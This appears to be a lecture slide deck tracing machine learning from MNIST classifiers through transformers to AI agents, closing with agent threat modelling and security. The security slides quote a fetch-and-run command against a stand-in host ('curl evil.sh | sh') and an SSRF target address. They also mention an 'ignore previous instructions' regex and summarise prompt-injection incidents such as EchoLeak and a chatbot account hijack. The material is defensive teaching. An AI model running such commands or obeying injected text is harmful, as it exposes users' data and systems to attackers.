Early Machine Learning (1989-1998)

Pattern Recognition Breakthroughs

  • Postal Address Recognition - Early neural networks deployed for real-world automation
  • MNIST Dataset (1998) - 70,000 handwritten digits (28×28 pixels)
  • Simple Neural Networks - Multilayer perceptrons with backpropagation

MNIST Dataset Structure

  • 60,000 training images
  • 10,000 test images
  • 784 features per image (28×28)
  • Grayscale values [0, 1]

These early systems proved that neural networks could solve real problems, setting the stage for deeper architectures.

MNIST: Preprocessing Tricks

Gaussian Blur for Robustness

Applying blur filtering smooths "human noise" - removing individual writing quirks while preserving overall digit shape.

Blur Formula (8-neighbor window):

f[i,j] = pixel[i,j] + Σ(neighbors) / w

w = weight parameter (optimal: 0.3-0.5)

Experimental Results (k-NN, k=1)

  • No blur: 88% accuracy
  • Blur training only: ~90% accuracy
  • Blur both: 90%+ accuracy (w=0.3-0.5)

Why Blurring Works

Character recognition depends on overall shape:

  • Curves and loops matter
  • Small bumps and nudges don't
  • Handwriting "flair" creates noise
  • Blurring emphasizes structure over details

Source: Project 2, Q1 - Gaussian blur experiments on mini-train (1000 samples)

MNIST: Naive Bayes Classifiers

Model Comparison

Bernoulli NB (Binary features)

  • Binarize pixels: threshold 0.1
  • P(pixel=1|digit) for each pixel
  • Accuracy: ~83%
  • Optimal α (Laplace smoothing): 0.001

Multinomial NB (3 levels)

  • Trinarize: {white, gray, black}
  • Thresholds: 0.1 and 0.9
  • Accuracy: ~82% (slightly worse)

Key Insights

Why Binary Works Better:

When recognizing symbols like digits, we remove as much information as possible to see shape clearly. Colors don't matter, shape does. Binary representation captures this better than gradients.

Gaussian NB Challenge

  • Initially: ~55% accuracy
  • Issue: Variance estimation problems
  • Solution: Tuning var_smoothing parameter
  • Optimized: ~83% accuracy (comparable to Bernoulli)

Source: Project 2, Q2-Q4 - Mini-train (1000) → Dev (1000)

Learning Paradigms

Supervised vs Unsupervised

Supervised Learning

  • Learns from labeled examples
  • Input → Output mapping
  • Examples: Image classification, spam detection

Unsupervised Learning

  • Discovers patterns without labels
  • Clustering, dimensionality reduction
  • Examples: Customer segmentation, anomaly detection

Generative vs Discriminative

Generative Models

  • Learn to create new data
  • Model the full distribution P(X)
  • Examples: GANs, VAEs, language models
  • Can generate images, text, audio

Discriminative Models

  • Learn to classify or predict
  • Model conditional P(Y|X)
  • Examples: Classifiers, regressors
  • Focus on decision boundaries
Self-Supervised Learning — labels are derived from the data itself (e.g. next-token prediction). LLM pretraining is self-supervised, not simply unsupervised: the supervision signal is built into the structure of the input.

Model Evaluation — Accuracy, Precision, Recall & F1

TP = True Positive TN = True Negative FP = False Positive FN = False Negative
Accuracy
"Out of all predictions, how many were correct?"
TP + TN TP + TN + FP + FN

Simple but can be misleading on imbalanced datasets — a model predicting "no cancer" always has high accuracy if only 1% of patients have cancer.

Precision
"Out of all positive predictions, how many were correct?"
TP TP + FP

High precision = few false alarms. Matters when false positives are costly (e.g. spam filter wrongly blocking real email).

Recall (True Positive Rate)
"Out of all actual positives, how many did we find?"
TP TP + FN

High recall = few misses. Matters when false negatives are costly (e.g. missing a cancer diagnosis).

F1 Score
"How well does the model balance precision and recall?"
2 × Precision × Recall Precision + Recall

Harmonic mean of precision and recall. Drops to zero if either component is zero — penalises extreme imbalance.

Neural Networks: The Core Idea

A Function Over Vectors

f(x)  =  p

input vector → output probability vector

  • Input layer — receives the raw feature vector (e.g. 784 pixel values)
  • Hidden layers — learn intermediate representations through weighted connections & activations
  • Output layer — emits a probability for each class (sums to 1 via softmax)
The network adjusts millions of weights during training so that f(x) assigns high probability to the correct class.

Why Activation Functions?

The linear problem

Without an activation function every layer is just a matrix multiply:

y = W₃(W₂(W₁x + b₁) + b₂) + b₃ = W′x + b′

No matter how many layers you stack, the whole network collapses to a single linear transformation — it can only draw straight decision boundaries.

Without activation functions the hidden layers are pointless — real data (images, speech, language) is deeply non-linear and a straight line can't separate cats from dogs.
h = σ(Wx + b)

Sigmoid σ(x)

Gradient → 0 at extremes → vanishing gradients

ReLU max(0, x)

Gradient is constant 1 when active — gradients flow freely through deep networks

Why sigmoid was a problem

  • Outputs always between 0 and 1
  • Activations are not zero-centered
  • Gradients get tiny at the extremes

Why ReLU became preferred

  • Faster training
  • Less vanishing gradient
  • Works much better in deep networks

Activation Functions & the Role of Bias

Multilayer Perceptrons (1989)

The Architecture

Layers:

  • Input layer: Raw features (e.g., 784 pixels)
  • Hidden layers: Non-linear transformations
  • Output layer: Class probabilities

y = σ(W₂ · σ(W₁ · x + b₁) + b₂)

Each neuron computes:

  • Weighted sum of inputs
  • Adds a bias term
  • Applies non-linear activation σ

Network Visualization

How to Train: Backpropagation (1986)

Training Algorithm

  • Forward pass: Compute predictions
  • Loss calculation: Compare to labels
  • Backward pass: Propagate error gradients
  • Weight update: Gradient descent

∂L/∂W = (∂L/∂y)(∂y/∂W)

Chain Rule — Gradient Flow

Loss Landscape & Gradient Descent

The loss landscape

Global minimum ▶

The deepest basin — best possible solution.

Local minimum ▶

False summit — gradient is zero but sub-optimal. Descent can get trapped here.

Learning rate η

High η ▶

Overshoots the basin, bounces, gets trapped in local min.

Low η ▶

Technically correct but converges extremely slowly.

Good η ▶

Efficient, stable convergence to the global minimum.

Output Layer — Digit Classification

Press F4 to load a new MNIST sample

Softmax — Turning Logits into Probabilities

The output layer produces 10 raw scores — logits. Softmax converts them into a valid probability distribution over digit classes.

For class i out of K classes:

σ(z)i = ezᵢ / Σ ezⱼ

j = 0 … K−1

All outputs ∈ (0, 1) — exponentiation forces positivity

Outputs sum to exactly 1 — valid probability distribution

Amplifies the largest logit — winner-takes-most effect

Cross-entropy loss measures how far σ(z) is from the one-hot target label.

Training Parameters — Learning Rate η

Controls how large a step we take along the gradient on each update.

w ← w − η · ∂L/∂w

b ← b − η · ∂L/∂b

Too high: overshoots the minimum — loss oscillates or diverges

Too low: converges correctly but extremely slowly

Typical values: 0.1 → 0.01 → 0.001, often decayed during training

Training in Practice — Optimization Algorithms

Vanilla SGD ▶

Fixed step along the gradient each update. Simple but slow — zigzags badly on elongated loss surfaces due to equal step size in all directions.

w ← w − η·∇L

SGD + Momentum ▶

Accumulates gradient history as velocity (β ≈ 0.9). Dampens per-step oscillations and accelerates in consistent descent directions.

v ← βv − η·∇L   w ← w + v

Adam — Default choice ★ ▶

Combines momentum (1st moment m) with per-parameter adaptive learning rates (2nd moment v). Bias-corrected. Works well out of the box.

m ← β₁m + (1−β₁)·∇L
v ← β₂v + (1−β₂)·(∇L)²
w ← w − η·m̂/(√v̂+ε)

β₁=0.9  β₂=0.999  η=0.001

AdamW ▶

Adam with decoupled weight decay. Fixes the L2 regularisation interaction present in standard Adam. Now the standard for transformer training.

LR Scheduling ▶

Warm-up → constant → cosine decay. Prevents early instability from large gradient steps and helps final convergence.

Statistical Bias — The Underfitting Problem

Not the neuron bias b. In ML theory, bias is the systematic error from a model that is too simple to fit the data.

Bias–Variance decomposition:

E[MSE] = Bias² + Variance + Noise

This is the expected total prediction error averaged over all possible training sets — not a partial derivative. Each term is an independent source of error.

Bias²: wrong on average — model assumptions don't match reality

Variance: sensitive to which training samples we happened to get

Noise: irreducible — inherent randomness in the data itself

Overfitting — When the Model Memorises

Overfitting: the model fits the training data so well that it learns its noise and quirks — and fails to generalise to new examples.

High training accuracy. Lower validation accuracy.

Epoch: one complete pass through the entire training dataset.

steps/epoch = Ntrain / batch_size

Training for too many epochs keeps pushing training accuracy up, but validation accuracy peaks and falls — the classic sign of overfitting.

Tips & Tricks — Setting Up Training

Overfitting Controls

Early stopping

Monitor validation loss. Stop when it stops improving for patience epochs. Save the best checkpoint.

Dropout

Randomly zero p% of activations each forward pass. Forces the network to learn redundant representations.

typical p = 0.1 – 0.5

L1 / L2 Regularisation

L2: loss += λ · Σ w²

L1: loss += λ · Σ |w|

Penalises large weights. L2 shrinks all weights; L1 drives many to zero (sparsity).

Data augmentation

Artificially expand training data with flips, crops, rotations, noise. The most reliable overfitting cure.

Optimisation

Batch normalisation

Normalise layer inputs to zero mean, unit variance per mini-batch. Allows higher learning rates and reduces sensitivity to initialisation.

LR scheduling

Start high to escape flat regions; decay to fine-tune near the minimum.

warm-up → cosine decay

Learning Rate Adjustments

start: 1e-3 – 1e-2

min: 1e-6 – 1e-5

too high → diverge

too low → stall

Gradient clipping

Cap gradient norm before the weight update. Prevents exploding gradients in deep or recurrent networks.

if ‖g‖ > τ: g ← g · τ/‖g‖

Adaptive optimisers

Adam, AdamW — maintain per-parameter learning rates using gradient momentum and second moment estimates. Default choice for most tasks.

Leaky ReLU

Dying ReLU problem: once a neuron outputs 0 for every input, its gradient is also 0 — weights never update and the neuron is permanently dead.

Leaky ReLU fix: replace the flat region with a tiny slope α (≈ 0.01). Gradient is never exactly zero, so dead neurons can recover and training stays stable in deep nets.

f(x) = x if x > 0, αx otherwise

Efficient Fine-tuning

Transfer learning

Start from a pre-trained model. Freeze early layers; fine-tune later layers on the target task. Needs far less data.

LoRA (Low-Rank Adaptation)

Instead of updating the full weight matrix W, inject a small trainable low-rank decomposition:

W' = W + A · BT

A is (d×r), B is (d×r), with r ≪ d. W stays frozen.

Reduces trainable parameters by 100–1000×. Widely used for LLM fine-tuning.

Weight initialisation

Xavier / He init scale weights by layer size — prevents vanishing or exploding activations from the very first forward pass.

Training CNNs — Backprop Through Convolution

Same as MLP

  • Forward pass → compute predictions
  • Cross-entropy loss function
  • Backpropagation via chain rule
  • Gradient descent — Adam / SGD

Key difference — shared weights

  • One 3×3 filter slides over the whole image
  • Same 9 weights used at every position
  • Gradient = sum over all positions applied
  • → far fewer parameters than a fully-connected layer

What filters learn

  • Early layers → edges, corners, gradients
  • Middle layers → textures, curves, patterns
  • Deep layers → object parts, faces, digits

Encoder–Decoder Architecture

Encoder–Decoder Key Concepts

"One label per pixel"

Semantic segmentation assigns a class label to every output pixel — the output is the same resolution as the input. Contrast with classification (one label per image) and detection (one label per bounding box).

What is "depth"?

Depth = the channel dimension of a feature tensor. A tensor 28×28×256 has spatial size 28×28 and depth 256. Each channel is one learned feature detector — edges, textures, curve orientations, semantic parts — stacked in depth.

Dense prediction ≠ bigger kernels

Pixel-level output comes from spatial reconstruction in the decoder (upsampling / deconvolution), not from using filters of different sizes. Larger or multi-scale kernels help capture context at different ranges, but they do not produce the per-pixel output on their own.

Encoder ≈ "what". Decoder ≈ "where".

Most semantic feature learning happens in the encoder. The decoder primarily recovers the spatial arrangement by reversing the pooling compression — though in modern architectures decoder heads can also contribute to classification, object queries, and masks.

Encoder + MLP is enough for classification

To answer "is there a bus in this image?" — yes, Conv2D + MaxPool × N → Global Avg Pool → FC is fully sufficient (VGG-16, ResNet). No decoder needed when you don't care about spatial location, only about which classes are present.

Decoder restores spatial structure, not relations

The decoder recovers which pixels belong to each object. Spatial relations ("bird is above the bridge") are a reading of the output map, not explicit reasoning by the decoder. Higher-level relational understanding requires additional modules (e.g. transformers, scene graphs).

Detection head — architecture

A detection head attaches to encoder features and predicts class + bounding box per candidate region: GAP → FC → [N class scores + 4 box coords (x,y,w,h)]. An attention decoder yields items + boxes; a full deconvolution decoder yields pixel-precise masks per item.

Transfer learning across scenes

CNNs learn composable, reusable features — edges, textures, wheels, windows. A model trained on buses learns what a bus looks like. In a new image containing both a bus and a car, bus features activate for bus pixels, car features for car pixels independently. The network generalises because features are object-specific, not scene-specific.

Labelled training → open-world inference

Training on labelled bus images teaches the encoder bus-specific patterns. At inference time a new image with multiple objects is processed region by region — the bus detector activates only where the bus pattern is present, regardless of other objects co-occurring in the scene. This is why multi-class detection works without retraining.

CNN Architectures 2012 – Present

The Breakthrough Era

  • AlexNet (2012) — 15.3% top-5 error, ReLU + GPU training
  • VGGNet (2014) — 16–19 layers, uniform 3×3 filters
  • GoogLeNet (2014) — Inception modules, 22 layers, 6.7% error
  • ResNet (2015) — Residual skip connections, 152 layers, 3.57% error
  • DenseNet (2017) — Every layer connected to every other
  • EfficientNet (2019) — Compound depth/width/resolution scaling

What Changed — and What Didn't

  • Residual connections solved vanishing gradients — networks could finally go very deep
  • Mobile-optimized CNNs (MobileNet, SqueezeNet) brought inference to edge devices
  • Transfer learning became standard — pretrain on ImageNet, fine-tune on any task
  • Vision Transformers (2020+) challenged CNNs on large-scale benchmarks
  • CNNs still dominate embedded AI, real-time and medical imaging today

Language Encoding & Vector Embeddings (2013-2015)

Representing Meaning as Vectors

  • Word2Vec (2013) - Google's breakthrough in word embeddings
  • GloVe (2014) - Stanford's global vector representation
  • Words become points in high-dimensional space
  • Semantic relationships encoded as distances

The Magic of Vector Math

king - man + woman ≈ queen

Paris - France + Italy ≈ Rome

Similarity in Vector Space

Words with similar meanings cluster together in the high-dimensional space:

Close together:

  • "dog" ↔ "puppy" ↔ "canine"
  • "running" ↔ "jogging" ↔ "sprinting"

Far apart:

  • "dog" ↔ "mathematics"
  • "happy" ↔ "table"

This enables machines to understand relationships and analogies without explicit programming.

Word Order: The Missing Piece

A Sentence as a Matrix

Each token maps to an embedding row vector. Stack them and you get a matrix.

“dog   bites   man”

d₀
d₁
d₂
d₃
d₄
d₅
d₆
d₇
…
dog
…
bites
…
man
…

Shape: 3 × 768  (e.g. BERT-base)

Problem: shuffle the rows → same vectors, different sentence.
The matrix alone carries no word order.

Order Is Meaning

dog bites man

→ routine incident

⇅

man bites dog

→ front-page news!

“The old man the boats”

garden-path: “old” is the noun, “man” is the verb

Solution: process words one at a time, in order — treating language as a time series.

x1 → x2 → x3 → x4   (RNN)

RNN: State Flows Through Time

per step: f( xt , ht−1 ) → ( yt , ht )

RNN Limitations

same cell, looped at every step

Fixed-Length Memory Bottleneck

The hidden state h is a vector of fixed size. No matter how long the input sequence, all context must be compressed into the same number of dimensions. As sentences grow longer, earlier tokens progressively lose their representation — crowded out by newer ones.

Vanishing Gradient

Backpropagation multiplies gradients at each time step. Over long sequences they shrink toward zero — tokens from early in a sentence barely influence the weights at all. The model becomes blind to long-range dependencies, even if they are semantically critical.

LSTM (1997) addressed the vanishing gradient — the Transformer (2017) eliminated both limitations entirely.

LSTM: The Cell State & Gates

The model carries a cell state C as a running memory. At each step, a forget gate erases irrelevant past, an input gate writes new information in, and an output gate decides what to expose as the next hidden state.

Hochreiter & Schmidhuber, 1997 — two memory streams (C and h) solve the vanishing gradient

RNNs & LSTMs: Applications & Limitations

Where They Succeeded

  • Machine translation — seq2seq models
  • Speech recognition
  • Text generation & sentiment analysis
  • Time series forecasting

LSTMs overcame the vanishing gradient, allowing models to retain context across hundreds of tokens — a real breakthrough for sequential language tasks in the early 2010s.

Why They Were Superseded

Sequential Bottleneck

Each token waits for the previous — no parallelization possible, making training on long sequences painfully slow.

Fixed-Size Memory

The entire context is squeezed into one hidden vector — long documents inevitably lose information.

Cannot Scale

Poor GPU utilization and memory constraints prevented the model scale that made modern LLMs possible.

Transformers (2017) eliminated the sequential bottleneck — enabling the scale that RNNs and LSTMs could never reach.

Attention "Making Skynet Possible"

"Attention is All You Need"

June 2017 - Vaswani et al., Google Brain

The Breakthrough

  • Self-Attention Mechanism - All tokens attend to all others simultaneously
  • Parallel Processing - No sequential dependency like RNNs
  • Positional Encoding - sin/cos functions preserve sequence order
  • Multi-Head Attention - Multiple attention patterns in parallel

What It Enabled

  • GPT (2018), BERT (2018), T5 (2019)
  • ChatGPT, Claude, Gemini (2022+)
  • The entire modern AI era

Self-Attention Mechanism

Scaled Dot-Product Attention

Attention(Q, K, V) = softmax(QKT / √dk) V
  • Q — What am I looking for?
  • K — What do I contain?
  • V — What do I actually say?
  • √dk — Scaling factor

Embeddings Get Richer Through Context

How Words Attend to Each Other (QKT)

What to emphasize in each token embedding (V)

Self-attention

Multi-Head Attention

Same budget, lower dimension — each head has its own WQi, WKi, WVi (shape d×dk), so the total parameter count equals one full d×d projection — the budget is divided, not multiplied.

Random init breaks symmetry — heads start with different random weights, so gradients diverge from the first step and each head learns to track a distinct relationship (syntax, coreference, position, …).

Positional Encoding: Sin & Cos

Adding a position signal to the embedding

Rotary Position Embedding (RoPE)

Encoding position by rotating the Q and K vectors

Transformer Block: Feed-Forward Network (FFN)

Working on each token independently — where the model (maybe?) stores learned patterns

FFN: Activation Functions

Fancy FFN: Gated Linear Units (GLU)

GLU-based FFNs make that transformation more selective and expressive by adding a learned gate.

The Transformer: Putting It All Together

Stacked blocks of Attention + FFN — applied to every token in parallel

HOW IT WORKS
  • ▸Input tokens → embedding matrix — each row is one token vector
  • ▸Attention — every token reads all others via Q·Kᵀ → weighted sum of V
  • ▸FFN — each token updated independently, applying learned patterns
  • ▸Stacked N times — each block builds richer context-aware representations
    BERT-base: 12  ·  GPT-2: 12–48  ·  GPT-3: 96
    LLaMA-7B: 32  ·  LLaMA-70B: 80  ·  GPT-4: undisclosed

Transformers for Vision & Image Generation

Vision Transformer (ViT)

  • Split image into fixed 16×16 patches, linearly embed each patch as a token
  • Prepend a learnable [CLS] token — read out for classification
  • Standard transformer encoder; no convolutions, no locality bias
  • Requires large-scale pretraining (JFT-300M) to beat CNN baselines
Key Papers
• Dosovitskiy et al. — ViT: An Image is Worth 16×16 Words 2010.11929 (2020)
• Touvron et al. — DeiT: Data-efficient Image Transformers 2012.12877 (2020)
• Liu et al. — Swin Transformer 2103.14030 (2021)
• Radford et al. — CLIP: Learning Transferable Visual Models 2103.00020 (2021)

Image Diffusion Transformers (DiT)

  • Forward process adds Gaussian noise over T steps; model learns to reverse it
  • DiT replaces the U-Net backbone with a transformer — scales with compute
  • Timestep t and class/text condition injected via adaLN-Zero modulation
  • Underpins Stable Diffusion 3, DALL·E 3, Flux, and Sora (video DiT)
Key Papers
• Ho et al. — DDPM: Denoising Diffusion Probabilistic Models 2006.11239 (2020)
• Rombach et al. — LDM / Stable Diffusion 2112.10752 (2021)
• Peebles & Xie — DiT: Scalable Diffusion Models with Transformers 2212.09748 (2022)
• Ramesh et al. — DALL·E 2 2204.06125 (2022)

AI Agents

A chatbot responds — an agent plans, acts, observes, and loops

Perceive
read input & memory
→
Reason
LLM decides next step
→
Act
call a tool or respond
→
Observe
read result, loop or stop
↻
Model
The LLM that reasons over whatever is in the context window. Everything else is scaffolding.
Tools
Functions the model can call — web search, code execution, file access, APIs. What makes an agent more than a chatbot.
Memory
Context window for now; files, databases, and vector stores for later. Retrieval bridges the two.
Orchestration
The harness that drives the loop, manages budget, and decides when the task is done.

AI Agents — Building Blocks

Four layers of structure — from a single message to a fully packaged capability

💬
Prompts
A single natural-language message telling the agent what to do right now.
The most basic unit — no tooling required.
"Summarise this document
in three bullet points."

"Find all TODO comments
in this repo."

"Reply in the user's language."
Scope: one call · no persistence · immediate intent
⚡
Skills
Named, reusable prompt templates that enforce consistent agent behavior across many calls.
Invoked by name — no need to re-explain every time.
/review  → code review
/summarise → doc summary
/translate → multilingual
/plan     → task planning
Scope: repeatable · versioned · sharable across agents
📦
Plugins
Self-contained bundles — system prompt, skills, tools, and config — shipped together as one consistent unit.
Install once; the agent behaves consistently by default.
📄system prompt ⚡bundled skills 🔧tool definitions ⚙️default config
Scope: turn-key · portable · consistent persona & capability
🗄️
MCP Servers
Structured knowledge endpoints the agent queries at runtime — databases, APIs, file trees, documentation.
Organised retrieval — the agent asks, the server answers.
🗃️company knowledge base 🔍web / doc search 🛠️internal tooling APIs 📁file system access
Scope: live data · typed schema · results loaded into context

Agent Memory

The context window limits how much of that saved information the model can use at one time.

Context Window — Working Memory
Everything the model can see right now — in one call.
2 ksystem instructions 10 kconversation history 40 kretrieved documents 20 ktool results 5 kagent scratchpad 51 kremaining ← query + answer
Total cap example: 128 k tokens
Saved Storage — Long-Term Memory
Everything the agent has written outside the model — no size limit.
files & docs database rows vector embeddings summaries task history tool logs plans user preferences
Could be 10 GB of docs, 50 past conversations, vector DB …
Key insight: The agent can save far more than fits in the context window — but the model can only reason over whatever is loaded right now.
Agent architecture
Persistent Storage
files · DB · vector store · logs
retrieve relevant pieces
↓
Context Window
working memory — what the model sees
↓
LLM Reasoning
next action or answer
save observations / results
↓
Back to Persistent Storage
Token Economy
Cost ∝ tokens in + tokens out — every API call has a price
• RAG: retrieve only the most relevant chunks — don't dump the whole store into context
• Summarise history: compress past turns before re-injecting them
• Truncate tool results: clip verbose API responses to the relevant fields
• Prompt caching: reuse a static system-prompt prefix across calls — up to 90 % cost reduction on repeated context

AI Threat Modelling

Why AI needs its own threat model

Same discipline as STRIDE/PASTA — only now bad data joins bad code and bad configuration as a failure source. Training sets, embeddings, and learned weights are attack surface, just like code and config always have been.

Key frameworks
  • STRIDE adapted for AI components
  • OWASP LLM Top 10 — LLM-specific vulnerability list
  • MITRE ATLAS — adversarial tactics & techniques for ML

One interface — it's all plain English

STRIDE for AI Systems

STRIDE — the classic Microsoft threat model — maps cleanly onto AI components. Each AI layer introduces new instances of each threat category.

S
Spoofing
Adversarial examples that trick an image classifier into misidentifying content — spoofing the model's perception of identity.
T
Tampering
Data poisoning during training, or weight tampering post-training to introduce backdoors — altering model behaviour maliciously.
R
Repudiation
No audit trail of what the model was queried with — attacker denies using the model to generate harmful content. AI decisions are often opaque.
I
Information Disclosure
Model inversion, membership inference, system prompt extraction, and training data memorisation — weights as a data breach.
D
Denial of Service
Inference-flooding, extremely long or expensive inputs (sponge attacks), and unbounded token generation consuming GPU compute.
E
Elevation of Privilege
Prompt injection to override system-level instructions, gaining capabilities beyond the intended scope — e.g. bypassing safety filters.

Attack Surfaces & Boundaries

Threat modelling a Multi-Agent System

Same boundaries — multiplied by the topology (advance to step through)

Example Attack

A compromised MCP server gets the agent to pay a fraudulent invoice — because it was already allowed to send e-mail (advance to step through)

How a Tool Call Actually Executes

The model emits JSON, never an action — the harness runs it. The permission gate is plain code that reads the JSON between emit and exec.

1 · DEFINE
tools[] schema
harness declares name + input_schema — developer-authored trusted config
→
2 · EMIT
tool_use block
model returns {name, input} + stop_reason — untrusted intent, just text
→
3 · GATE 🛡
permission gate
plain code inspects name + input → allow / ask / deny. The boundary.
→
4 · EXEC
subprocess on host
bash -c "npm test" runs with the harness process's OS rights — i.e. yours
→
5 · RETURN
tool_result
stdout re-enters the context as untrusted input — loop repeats
① REQUEST — what the harness defines
"tools": [{ "name": "run_bash", "description": "Run a bash command", "input_schema": { "type": "object", "properties": { "command": { "type": "string" } }, "required": ["command"] } }]
② MODEL → tool_use (the "command")
{ "type": "tool_use", "id": "toolu_01A09…", "name": "run_bash", "input": { "command": "npm test" } } stop_reason: "tool_use" ↑ structured JSON — not a shell string, not prose
③ HARNESS → tool_result (back to model)
{ "type": "tool_result", "tool_use_id": "toolu_01A09…", "content": "42 passing, 0 failing", "is_error": false } tool_use_id ties the result to the call · output is now untrusted context (LLM01)

Why the shape matters: a bash tool hands the gate one opaque command string — same shape for ls and curl evil.sh | sh. Promote risky actions to dedicated tools (e.g. send_email with typed to/subject/body) so the gate has typed fields it can actually check. Anthropic's built-in bash tool (type: "bash_20250124") ships the schema, but your harness still executes it.

Agent Security

The map above, as an engineering checklist — what becomes tokens, what cuts the odds, what actually stops attacks

Attacker-Controlled Tokens
One model context ✗ NOT A SECURITY BOUNDARY
Web pages, RAG chunks, MCP tool descriptions and tool output land in the same context window as the user's request. Role and source tags are advisory — the model interprets them probabilistically and may not reliably separate instructions from data.
The loop multiplies exposure
Tool results re-enter the context on every iteration. Anything a command touches — file contents, git logs, API responses — gets a turn at steering the next action.
Persistent memory carries it forward
Saved facts and notes re-enter context in later turns and sessions, with no inherent provenance or expiry. A write made under injection outlives the prompt that caused it; a shared store leaks memories across users.
Effectors give words hands
Shell, file system, network and MCP calls turn a hijacked context into real actions on the host and on third-party systems — destructive and often irreversible.
The weights themselves
Poisoned training or fine-tuning data bakes behaviour into the model before deployment. No runtime gate can see it — the model itself is the payload.
Probabilistic — Cuts the Odds layers, not boundaries
Model hardening
RLHF and instruction-hierarchy training teach the model to favour the system prompt over injected text. It loses less often — but training is not enforcement.
Prompt rules
"Never reveal secrets, never call external URLs" — useful guidance, but it competes with attacker text inside the same flat stream. Persuasion sometimes beats policy.
Filters & classifiers
Ingress scanners and output moderation catch known injection patterns and leaking secrets. Each one can be evaded — they lower the odds, never to zero.
The human in the loop
Approval prompts degrade under fatigue: a stream of boring requests trains reflexive clicking, then request #23 exfiltrates. Allowlist the routine so a prompt stays a rare, real signal.
Deterministic — Hard Stops the four 🛡 walls in the map
Ingress admission 🛡 INGRESS BOUNDARY
User authn, signed & pinned config, fetch-domain and MCP-server allowlists, per-user ACLs on RAG & memory. Controls who may speak — whatever passes is still untrusted data.
Permission gate + sandbox 🛡 INTERNAL BOUNDARY
Plain code, fail-closed, checks every tool call on every loop iteration — approval never covers the response. The sandbox bounds the worst case: isolated filesystem, no free egress.
Scoped credentials & egress control 🛡 EGRESS BOUNDARY
Least-privilege, short-lived tokens cap the blast radius of any hijack. Egress allowlists, outbound DLP and no auto-rendered links block the leak's second half.
Budgets, quotas & audit 🛡 PROVIDER API BOUNDARY
Hard caps on iterations, tokens, cost and time end runaway loops and denial-of-wallet. Log every tool call with inputs and outputs — investigations and rollbacks need the trail.

⇒ Treat external content & tool results as attacker-controlled. The orange layer lowers the odds — the four walls enforce policy in code: ingress · permission gate · egress · provider API. The model interprets policy; the system must enforce it.

Why Internal Security Is Hard

A tool can be read-only and still steer an agent that holds write privileges elsewhere — that is the dangerous boundary. indirect prompt injection · MCP tool poisoning · cross-tool privilege escalation · confused deputy · excessive agency

The attack path — one input wields another tool's privilege
Why ordinary permissions don't solve it
OAuth & MCP authorization prove the agent may use the user's mailbox and that tokens are valid for the right resource — not that the user authorized this mail, to this recipient, with this content, for this purpose. “The agent may send e-mail” is simply too broad a permission.
Controls that actually stop it separate authority from data
1
Bind authorization to the exact action. Mint the approval outside the LLM, bound to the precise parameters — change the recipient, subject or attachment and it is void.
{ action:"email.send", to:"alice@co.com", subject:"Q report",
  attachment:"q-report.pdf", single_use:true, expires:"10:05Z" }
2
The harness — not the LLM — confirms side-effects. Show the real recipient & payload for approval. “A tool asked me to” is itself grounds for rejection: tools are data sources, not principals that may authorize actions.
3
Split untrusted-read from privileged-write agents. The write agent never sees the raw MCP response — only a narrow, structured result (title · findings[] · citations[]). No free text crosses the trust line.
4
Enforce a deterministic cross-tool provenance policy. Track where each argument came from; a high-impact call needs an argument origin the policy trusts.
value / action origin
draft
send
direct user instruction
✓
confirm exact details
website · MCP · inbound e-mail
✓
✗ denied · needs new approval
Not enough alone: “never obey tools” prompts · regex for “ignore previous instructions” · temperature 0 · stripping HTML / invisible text · trusting the install-time tool description · approving only when the tool is first connected — injection can be indirect, obfuscated, or look like ordinary business data.
Untrusted content must never authorize a privileged action. Enforce it by scoping tools to least privilege and letting a deterministic policy layer — not the LLM — authorize each call.

External Input Is Attacker-Controlled

The moment an agent reads something it didn't write, that text is a prompt — whoever authored it is now writing your instructions

Hidden prompts in fetched HTML
A page renders clean to a human but carries instructions the model still reads. The payload doesn't need to be visible — only present in the text the agent ingests.
Defence: strip to visible text · render-then-read, not raw HTML · no auto-loaded links/images.
RAG: your own corpus turns hostile
Retrieval pastes "trusted" documents straight into context — but the store is only as clean as everything ever ingested into it. LLM08
Defence: vet documents at ingestion · per-user ACLs at query time · treat embeddings as sensitive as source.
What actually does the "web search"
The model never touches the internet itself — a tool does, then pastes the result back into context. Each hop is a trust transfer worth knowing.
Watch: SSRF via fetcher (ask it to hit 169.254.169.254) · domain allowlists · egress from the fetch host.

⇒ Fetched ≠ trusted. Web pages, RAG chunks and search results are data, never instructions — sanitise at ingress, and assume every byte was written by an attacker.

MITRE ATLAS

Adversarial Threat Landscape for AI Systems — ATT&CK's sibling matrix for attacks on AI, built from real incidents

The tactic kill chain — an attacker's campaign, left to right
Reconnaissance→ Resource Development→ Initial Access→ ★ AI Model Access→ Execution→ Persistence→ Privilege Escalation→ Defense Evasion→ Credential Access→ Discovery→ Collection→ ★ AI Attack Staging→ Exfiltration→ Impact ★ = AI-specific stages ATT&CK doesn't have
Techniques — every cell has an AML. ID; these five appear on the next slide
AML.T0051
LLM Prompt Injection
.000 direct (the user is the attacker) · .001 indirect (the payload hides in content the agent reads)
AML.T0057
LLM Data Leakage
secrets, PII or proprietary data exit through the model's responses or its egress channels
AML.T0010
AI Supply Chain Compromise
poisoned pre-trained models, datasets or AI tooling pulled in from upstream
AML.T0020
Poison Training Data
planted examples bake attacker-chosen behaviour into the weights before deployment
AML.T0047
AI-Enabled Product Abuse
turning a legitimate AI product against its operator — no exploit, just misuse of what it's allowed to do
Why it matters next to OWASP
OWASP LLM Top 10 names what can go wrong in your app; ATLAS describes how an adversary runs the campaign — step by step across the kill chain. Use OWASP to scope defences, ATLAS to red-team them and to name what you find.
Built from real incidents
Every technique links to mitigations (AML.M) and to 30+ public case studies (AML.CS) — Tay is CS0009, PoisonGPT is CS0019. Browse the matrix at atlas.mitre.org →

Threat Models Meet Reality

Spectacular real-world incidents, mapped to OWASP Top 10 for LLM Apps (2025), OWASP Agentic AI Threats & Mitigations (2025) and MITRE ATLAS

NEW · JUN 2026
Meta AI support chatbot hands over 20,000+ Instagram accounts
Hackers just asked Meta's High Touch Support agent to link victims' accounts to their own email — it complied, no verification. 20,225 accounts hijacked, including the Obama White House and Sephora.
✗ Missing boundary: ingress authn — the agent never verified the requester owned the account, and no gate guarded an irreversible account change.
LLM01 Prompt Injection LLM06 Excessive Agency T9 Identity Spoofing T2 Tool Misuse ATLAS T0047 AI-Enabled Product Abuse
EchoLeak — M365 Copilot 2025
Zero-click prompt injection (CVE-2025-32711): a single crafted email silently turned Copilot into a data-exfiltration channel — no link clicked, no user action at all.
LLM01 Prompt Injection LLM02 Info Disclosure T6 Goal Manipulation ATLAS T0051.001 Indirect Injection T0057 LLM Data Leakage
✗ Missing boundary: egress boundary — auto-rendered content gave secrets a path out, and untrusted e-mail entered the context unmarked.
